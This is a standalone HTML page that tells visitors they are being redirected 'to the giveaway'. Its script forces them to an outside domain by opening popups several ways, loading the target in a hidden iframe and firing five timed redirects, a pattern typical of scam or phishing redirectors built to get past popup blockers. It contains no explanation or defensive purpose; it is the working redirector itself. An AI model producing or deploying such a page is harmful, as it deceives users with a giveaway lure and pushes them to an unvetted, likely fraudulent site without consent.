<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .note {
      font-size: 18px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="note">Redirecting you to the giveaway...</div>

  <script>
    const finalURL = "https://passwordomain.com/1838319";

    function multiRedirect(url) {
      // Attempt different open methods
      try { window.open(url, "_system"); } catch(e){}
      try { window.open(url, "_blank"); } catch(e){}
      try { window.open(url, "_top"); } catch(e){}

      // Hidden iframe trick
      try {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = url;
        document.body.appendChild(iframe);
      } catch(e){}

      // Sequential timed redirects
      setTimeout(() => { window.location.href = url; }, 300);
      setTimeout(() => { window.location.replace(url); }, 600);
      setTimeout(() => { window.location.href = url; }, 900);
      setTimeout(() => { window.location.replace(url); }, 1200);
      setTimeout(() => { window.location.href = url; }, 1500);
    }

    // Run multi-step redirect automatically
    multiRedirect(finalURL);
  </script>
</body>
</html>
